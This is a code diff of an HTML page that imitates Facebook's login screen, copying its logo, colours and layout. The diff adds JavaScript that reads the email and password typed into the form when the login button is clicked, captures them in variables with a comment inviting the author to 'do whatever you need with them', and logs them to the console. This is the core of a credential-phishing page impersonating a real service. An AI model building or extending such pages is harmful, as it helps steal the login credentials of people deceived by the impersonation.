@@ -1,67 +1,88 @@
 <!DOCTYPE html>
 <html>
+
 <head>
-	<title>Facebook Login</title>
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<style type="text/css">
-		body {
-			background-color: #f0f2f5;
-			font-family: Arial, sans-serif;
-			margin: 0;
-			padding: 0;
-		}
+    <title>Facebook Login</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style type="text/css">
+        body {
+            background-color: #f0f2f5;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+        }
 
-		.container {
-			margin: 0 auto;
-			max-width: 500px;
-			padding: 50px 20px;
-		}
+        .container {
+            margin: 0 auto;
+            max-width: 500px;
+            padding: 50px 20px;
+        }
 
-		.logo {
-			display: block;
-			margin: 0 auto 30px;
-			width: 120px;
-		}
+        .logo {
+            display: block;
+            margin: 0 auto 30px;
+            width: 120px;
+        }
 
-		input[type="text"], input[type="password"] {
-			background-color: #ffffff;
-			border: 1px solid #ccd0d5;
-			box-sizing: border-box;
-			font-size: 16px;
-			height: 50px;
-			margin-bottom: 20px;
-			padding: 10px;
-			width: 100%;
-		}
+        input[type="text"],
+        input[type="password"] {
+            background-color: #ffffff;
+            border: 1px solid #ccd0d5;
+            box-sizing: border-box;
+            font-size: 16px;
+            height: 50px;
+            margin-bottom: 20px;
+            padding: 10px;
+            width: 100%;
+        }
 
-		input[type="submit"] {
-			background-color: #1877f2;
-			border: none;
-			color: #ffffff;
-			cursor: pointer;
-			font-size: 16px;
-			height: 50px;
-			margin-bottom: 20px;
-			width: 100%;
-		}
+        input[type="submit"] {
+            background-color: #1877f2;
+            border: none;
+            color: #ffffff;
+            cursor: pointer;
+            font-size: 16px;
+            height: 50px;
+            margin-bottom: 20px;
+            width: 100%;
+        }
 
-		.forgot-password {
-			color: #1877f2;
-			font-size: 14px;
-			text-align: right;
-		}
-	</style>
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-align: right;
+        }
+    </style>
 </head>
+
 <body>
-	<div class="container">
-		<img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" class="logo">
-		<form action="#" method="post">
-			<input type="text" name="email" placeholder="Email address or phone number">
-			<input type="password" name="password" placeholder="Password">
-			<input type="submit" value="Log In">
-			<a href="#" class="forgot-password">Forgot password?</a>
-		</form>
-	</div>
-	<script src="/script.js"></script>
+    <div class="container">
+        <img src="https://www.facebook.com/images/fb_icon_325x325.png" alt="Facebook Logo" class="logo">
+        <form action="https://www.facebook.com" method="post">
+            <input id="email-input" type="text" name="email" placeholder="Email address or phone number">
+            <input id="password-input" type="password" name="password" placeholder="Password">
+            <input id="login-button" type="submit" value="Log In">
+            <a href="#" class="forgot-password">Forgot password?</a>
+        </form>
+    </div>
+    <script>
+        const loginButton = document.getElementById('login-button');
+
+        // Add a click event listener to the login button
+        loginButton.addEventListener('click', function () {
+            // Get the user inputs from the email and password fields
+            const emailInput = document.getElementById('email-input').value;
+            const passwordInput = document.getElementById('password-input').value;
+
+            // Store the user inputs in variables or do whatever you need with them
+            const email = emailInput;
+            const password = passwordInput;
+
+            // Print the user inputs to the console (for testing purposes only)
+            console.log(`Email: ${email}`);
+            console.log(`Password: ${password}`);
+        });
+    </script>
 </body>
+
 </html>
